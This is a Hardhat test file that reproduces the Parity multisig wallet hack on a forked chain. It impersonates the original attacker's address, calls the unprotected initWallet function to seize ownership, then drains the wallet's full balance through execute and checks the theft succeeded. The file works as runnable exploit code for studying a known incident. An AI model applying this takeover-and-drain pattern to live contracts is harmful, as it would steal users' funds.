const {expect} = require("chai")
const {ethers} = require("hardhat")

// Address of involved parties
const walletAddress = "0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e";
const hackerAddress = "0xB3764761E297D6f121e79C32A65829Cd1dDb4D32";

// Contract ABI
const abi = [
    "function initWallet(address[] _owners, uint _required, uint _daylimit)",
    "function execute(address _to, uint _value, bytes data) external"
]

const blockNumber = 4043801;

describe("Parity Hack", () => {
    let hacker;
    let wallet;

    // Initialize values for testing
    beforeEach(async () => {
        // Impersonating the hacker's account
        await hre.network.provider.request({
            method: "hardhat_impersonateAccount",
            params: [hackerAddress]
        })
        hacker = await ethers.getSigner(hackerAddress)
        wallet = new ethers.Contract(walletAddress, abi, hacker)
    })

    it(`Block number should be ${blockNumber}`, async () => {
        const _blockNum = await ethers.provider.getBlockNumber()
        expect(_blockNum).to.equal(blockNumber)
    })

    it("Should steal funds and update balances", async () => {
        const walletBalBefore = await ethers.provider.getBalance(walletAddress)
        const hackerBalBefore = await ethers.provider.getBalance(hackerAddress)
        
        // we call the unprotected initWallet method.
        await wallet.connect(hacker).initWallet([hackerAddress], 1, 0);
        console.log(`wallet balance before to the hack --> ${ethers.utils.formatEther(walletBalBefore)} Eth`);
        console.log(`hacker balance before to the hack --> ${ethers.utils.formatEther(hackerBalBefore)} Eth`);
        expect(Math.trunc(Number(walletBalBefore))).to.be.greaterThan(0);

        // steal the funds to the hacker address
        await wallet.connect(hacker).execute(hackerAddress, walletBalBefore, "0x");
        const hackerBalAfter = await ethers.provider.getBalance(hackerAddress)
        const walletBalAfter = await ethers.provider.getBalance(walletAddress)
        console.log(`wallet balance after the hack --> ${ethers.utils.formatEther(walletBalAfter)} Eth`);
        console.log(`hacker balance after the hack --> ${ethers.utils.formatEther(hackerBalAfter)} Eth`);
        const hackedAmount = hackerBalAfter.sub(hackerBalBefore);
        console.log(`Succesfully hacked --> ${ethers.utils.formatEther(hackedAmount)}Eth`);
        expect(walletBalAfter).to.be.equal(0)

        // hacker should have more ethers now before the attack operation
        expect(Math.trunc(Number(hackerBalAfter))).to.be.greaterThan(Math.trunc(Number(hackerBalBefore)))
    })
})